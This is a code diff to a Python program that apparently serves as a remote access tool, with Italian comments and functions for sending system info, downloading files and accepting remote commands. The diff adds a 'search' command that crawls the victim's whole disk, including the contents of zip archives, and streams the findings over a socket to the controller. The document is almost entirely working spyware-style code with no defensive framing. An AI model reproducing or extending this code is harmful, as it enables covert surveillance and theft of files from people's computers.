@@ -10,6 +10,7 @@ import subprocess
 from threading import Timer
 from colorama import Fore
 import zipfile
+from pathlib import Path
 
 # OK mando informazioni so
 def sendInfo(client):
@@ -216,6 +217,7 @@ def find(comando, client):
         client.send(("[ERROR] Path doesn't exist").encode(FORMAT))
 
 
+# OK
 def download(comando, client):
 
     counter_virgolette = 0
@@ -314,7 +316,7 @@ def download(comando, client):
             os.chdir(pathtoremember)
 
 
-#aprire i file
+# OK aprire i file .zip
 def openZip(comando,client):
     result=[]
     if comando.endswith(".zip\""):
@@ -349,6 +351,82 @@ def openZip(comando,client):
 
         time.sleep(5)
 
+
+def search(filesearch, client):
+    try:
+        time.sleep(4)
+
+        allType = ""
+        result = [""]
+        path="null"
+        counter_elemets=0
+
+        if platform.system() == "Windows":
+            path = "C:\\"
+        elif platform.system() == "Darwin":
+            path = "/Users/"
+        else:
+            path = "/"
+
+        for cartella, sottocartelle, file in os.walk(path):
+            for item in file:
+                itemTmp = item.lower()
+                fileTmp = filesearch.lower()
+                if (Path(itemTmp).stem)==(Path(fileTmp).stem):
+                    if item.endswith(".zip"):
+                        result.append('"' + item + '"' + " nel percorso: " + cartella)
+                        pathcurrent = os.getcwd()
+                        os.chdir(cartella)
+                        counter_elemets += 1
+                        zf = zipfile.ZipFile(item, 'r')
+                        os.chdir(pathcurrent)
+                        for item2 in zf.namelist():
+                            result.append("\n\t-:" + '"' + item2 + '"')
+                        result.append("\n\n")
+
+                    else:
+                        counter_elemets += 1
+                        result.append(f"\n File '" + filesearch + "' trovato:\n\t" + '"' + item + '"' + " nel percorso: " + cartella + "\n")
+                elif fileTmp in str(itemTmp):
+                    if item.endswith(".zip"):
+                        result.append('"' + item + '"' + " nel percorso: " + cartella)
+                        pathcurrent = os.getcwd()
+                        os.chdir(cartella)
+                        counter_elemets += 1
+                        zf = zipfile.ZipFile(item, 'r')
+                        os.chdir(pathcurrent)
+                        for item2 in zf.namelist():
+                            result.append("\n\t-:" + '"' + item2 + '"')
+                        result.append("\n\n")
+
+                    else:
+                        counter_elemets += 1
+                        result.append(f"\n File '" + filesearch + "' ha corrispondenze in:\n\t" + '"' + item + '"' + " nel percorso: " + cartella + "\n")
+
+        result.append("\n----Trovati "+str(counter_elemets)+f" elementi simili a '{filesearch}'.")
+        result = ''.join(result)
+        try:
+            encode=result.encode(FORMAT)
+            x=1024
+            y=x+1024
+
+            line = encode[0:1024]
+            client.send(line)
+            while (line):
+                line = encode[x:y]
+                client.send(line)
+                x = x+1024
+                y = x+1024
+
+            time.sleep(2)
+            client.send(("[END]").encode(FORMAT))
+
+        except:
+            client.send(("[ERROR]").encode(FORMAT))
+    except:
+        client.send(("[ERROR]").encode(FORMAT))
+
+    time.sleep(5)
 
 # funzione di remote control
 def openRemoteControl(client):
@@ -440,6 +518,18 @@ def openRemoteControl(client):
                     try:
                         estensione = comando[10:]
                         filespath(estensione, client)
+                    except:
+                        pass
+                else:
+                    pass
+
+            elif comando[0:6] == "search":
+                #reg = "^filespath( \.[a-z]{1,4})+"
+                reg = r'^search [\s\S]+\.[a-z]{1,4}'
+                reg2 = r'^search ([a-zA-Z0-9, ,\-,\_]+)'
+                if(re.match(reg, comando)) or (re.match(reg2, comando)):
+                    try:
+                        search(comando[7:], client)
                     except:
                         pass
                 else:
